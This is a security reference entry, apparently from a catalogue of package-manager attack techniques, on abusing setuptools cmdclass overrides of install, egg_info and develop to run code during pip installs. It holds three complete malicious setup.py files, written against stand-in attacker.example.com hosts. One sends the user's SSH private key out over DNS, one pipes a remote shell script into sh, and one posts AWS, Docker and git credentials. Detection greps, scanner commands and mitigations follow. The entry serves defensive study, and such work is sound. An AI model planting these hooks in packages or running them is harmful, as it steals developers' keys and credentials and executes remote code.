---
name: "setuptools cmdclass Command Override"
packageManager: "pip"
slug: "pip-cmdclass-override"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "The setuptools cmdclass parameter allows package authors to override built-in setup commands such as install, develop, egg_info, build_ext, and sdist by mapping them to custom Python classes. Attackers exploit this to inject malicious code that executes at specific stages of the pip lifecycle, including installation, development mode setup, and even metadata generation. This is more targeted than raw setup.py code execution because the attacker can hook into the exact phase of the build/install process that best suits their payload delivery, and the malicious class methods blend in with legitimate build customizations."
prerequisites:
  - "Victim installs the malicious package from source (not a pre-built wheel)"
  - "The package uses setuptools with a setup.py containing cmdclass overrides"
  - "pip executes the overridden command as part of the install lifecycle"
attackScenarios:
  - title: "Overriding the install command to execute payload"
    description: "The attacker subclasses setuptools' install command and overrides the run() method to inject malicious code that executes when the user runs pip install. The malicious run() method performs its payload before or after calling the parent class's run(), ensuring the installation completes normally to avoid suspicion."
    commands:
      - label: "setup.py with malicious install cmdclass override"
        code: |
          from setuptools import setup
          from setuptools.command.install import install
          import os
          import subprocess

          class PostInstallCommand(install):
              """Overridden install command that executes a payload."""

              def run(self):
                  # Execute payload before normal install
                  self._exfiltrate()
                  # Call parent install so the package installs normally
                  install.run(self)

              def _exfiltrate(self):
                  # Gather system information
                  info = subprocess.check_output(
                      ["whoami"], stderr=subprocess.DEVNULL
                  ).decode().strip()
                  home = os.path.expanduser("~")

                  # Read SSH keys if present
                  ssh_key_path = os.path.join(home, ".ssh", "id_rsa")
                  ssh_key = ""
                  if os.path.exists(ssh_key_path):
                      with open(ssh_key_path) as f:
                          ssh_key = f.read()

                  # Exfiltrate via DNS (stealthier than HTTP)
                  import base64
                  encoded_info = base64.b32encode(info.encode()).decode().strip("=")
                  os.system(f"nslookup {encoded_info}.exfil.attacker.example.com")

                  # Also exfiltrate the SSH key in chunks via DNS
                  if ssh_key:
                      chunks = [ssh_key[i:i+60] for i in range(0, len(ssh_key), 60)]
                      for idx, chunk in enumerate(chunks):
                          encoded_chunk = base64.b32encode(chunk.encode()).decode().strip("=")
                          os.system(f"nslookup {idx}.{encoded_chunk}.key.attacker.example.com")

          setup(
              name="crypto-utils",
              version="3.0.1",
              packages=["crypto_utils"],
              cmdclass={
                  "install": PostInstallCommand,
              },
          )
        language: "python"
  - title: "Hooking egg_info for execution during pip download"
    description: "The egg_info command runs even during pip download and pip install --dry-run in some pip versions, making it an especially dangerous hook point. By overriding egg_info, an attacker can achieve code execution before the user has committed to installing the package."
    commands:
      - label: "setup.py with egg_info cmdclass override"
        code: |
          from setuptools import setup
          from setuptools.command.egg_info import egg_info
          import os

          class MaliciousEggInfo(egg_info):
              def run(self):
                  # This runs during metadata collection, even before install
                  os.system("curl -s https://attacker.example.com/stage2.sh | sh")
                  egg_info.run(self)

          setup(
              name="json-parser-utils",
              version="1.2.0",
              cmdclass={
                  "egg_info": MaliciousEggInfo,
              },
          )
        language: "python"
  - title: "Overriding develop command for editable installs"
    description: "The develop command runs when a package is installed in editable/development mode (pip install -e). Attackers targeting developers specifically can override this command, knowing it will only fire in development environments where more sensitive credentials and source code are present."
    commands:
      - label: "setup.py with develop cmdclass override"
        code: |
          from setuptools import setup
          from setuptools.command.develop import develop
          import os
          import json
          import urllib.request

          class MaliciousDevelop(develop):
              def run(self):
                  # Target developer workstations specifically
                  dev_info = {
                      "git_config": "",
                      "aws_creds": "",
                      "docker_config": "",
                  }

                  # Harvest developer-specific config files
                  home = os.path.expanduser("~")
                  targets = {
                      "git_config": os.path.join(home, ".gitconfig"),
                      "aws_creds": os.path.join(home, ".aws", "credentials"),
                      "docker_config": os.path.join(home, ".docker", "config.json"),
                  }
                  for key, path in targets.items():
                      if os.path.exists(path):
                          with open(path) as f:
                              dev_info[key] = f.read()[:1000]

                  # Exfiltrate
                  data = json.dumps(dev_info).encode()
                  try:
                      req = urllib.request.Request(
                          "https://attacker.example.com/dev",
                          data=data,
                      )
                      urllib.request.urlopen(req, timeout=3)
                  except Exception:
                      pass

                  develop.run(self)

          setup(
              name="dev-toolkit",
              version="0.9.0",
              cmdclass={
                  "develop": MaliciousDevelop,
              },
          )
        language: "python"
detection:
  - title: "Inspect cmdclass definitions in setup.py"
    description: "Search for cmdclass parameter usage in setup.py and review any custom command classes for suspicious behavior such as network access, file reads outside the package directory, subprocess calls, or encoded/obfuscated strings."
    commands:
      - code: |
          # Download and extract the package source
          pip download --no-deps --no-binary :all: <package-name> -d /tmp/inspect
          cd /tmp/inspect && tar xzf *.tar.gz

          # Search for cmdclass overrides
          grep -rn "cmdclass" */setup.py

          # Look for suspicious patterns in command class definitions
          grep -rn -A 20 "class.*\(install\)\|class.*\(develop\)\|class.*\(egg_info\)\|class.*\(build_ext\)" */setup.py

          # Check for dangerous function calls in the overrides
          grep -rn "os\.system\|subprocess\|urllib\|socket\|exec(\|eval(\|__import__\|base64" */setup.py
        language: "bash"
  - title: "Use static analysis tools to scan setup.py"
    description: "Tools like bandit or semgrep can automatically detect suspicious patterns in setup.py files, including command injection, network access, and file system manipulation in build scripts."
    commands:
      - code: |
          # Install and run bandit on the setup.py
          pip install bandit
          bandit -r /tmp/inspect/*/setup.py -ll

          # Use semgrep with Python security rules
          pip install semgrep
          semgrep --config p/python /tmp/inspect/*/setup.py
        language: "bash"
mitigation:
  - "Install packages using --only-binary :all: to skip setup.py execution entirely"
  - "Audit cmdclass definitions in setup.py before installing any package from source"
  - "Use pip install --no-build-isolation cautiously; prefer isolated build environments"
  - "Migrate to PEP 517/518 builds with pyproject.toml which have more constrained build backends"
  - "Implement code review policies for all new dependencies, focusing on setup.py and build scripts"
  - "Run package installations in containers or VMs with limited network access and filesystem permissions"
  - "Use tools like pip-audit to check for known vulnerabilities in dependencies"
references:
  - title: "setuptools documentation - Command Reference"
    url: "https://setuptools.pypa.io/en/latest/references/keywords.html"
  - title: "setuptools documentation - Extending and Reusing Setuptools"
    url: "https://setuptools.pypa.io/en/latest/userguide/extension.html"
  - title: "Typosquatting Campaign Targets Python Developers"
    url: "https://www.techtarget.com/searchsecurity/news/366577455/Typosquatting-campaign-malicious-packages-slam-PyPi"
  - title: "PEP 517 - A build-system independent format for source trees"
    url: "https://peps.python.org/pep-0517/"
created: 2026-04-02
updated: 2026-04-02
---
